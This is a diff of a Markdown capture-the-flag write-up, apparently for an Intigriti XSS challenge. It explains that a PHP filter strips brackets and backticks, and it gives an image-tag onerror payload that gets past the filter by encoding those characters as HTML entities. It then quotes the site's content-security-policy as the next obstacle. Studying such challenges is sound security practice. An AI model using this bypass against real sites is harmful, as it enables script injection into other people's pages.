@@ -4,7 +4,7 @@ $stringa='/[(\`\)]/';
 $variabile=preg_replace($stringa,'NotAllowedCaracter',$YourPayload);
 ```
 + we are not allowed to use brackets nor backticks. However, we are able to bypass this by encoding these characters using HTML entities
-+ payload: <img src=x onerror=alert&lpar;1&rpar;>.
++ payload: `<img src=x onerror=alert&lpar;1&rpar;>.`
 + next problem : csp
 `content-security-policy: default-src 'none'; style-src 'nonce-5e05f7032c49f6f9667962037c1c8ca18115c037'; script-src 'nonce-5e05f7032c49f6f9667962037c1c8ca18115c037'; img-src 'self'`
 ![image](https://github.com/av4nth1ka/Intigriti-XSS-challenges/assets/80388135/262edd23-d537-431e-b890-99a250b258e5)
